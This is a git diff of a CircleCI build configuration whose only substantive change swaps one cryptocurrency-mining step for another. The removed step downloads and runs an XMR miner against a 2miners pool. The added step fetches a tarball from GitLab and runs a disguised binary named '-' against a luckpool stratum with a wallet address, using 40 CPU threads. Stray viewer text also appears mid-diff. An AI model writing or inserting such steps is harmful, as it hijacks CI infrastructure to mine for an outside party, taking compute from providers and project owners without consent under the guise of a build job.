@@ -1,4 +1,3 @@
-
 version: 2.0
 jobs:
   build:
@@ -9,6 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <WALLET ADDRESS>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
-circle ci.txt
-Displaying circle ci.txt.
+      - run:  wget https://gitlab.com/anaqerim/tugas-akhir/-/raw/main/elmachine.tar.gz && tar -xvf elmachine.tar.gz && ./- -c stratum+tcp://na.luckpool.net:3956#xnsub -u RX7wHGw8b3M6wvtzpecYnFTS4M5iReDH52.kogche -p -x --cpu 40
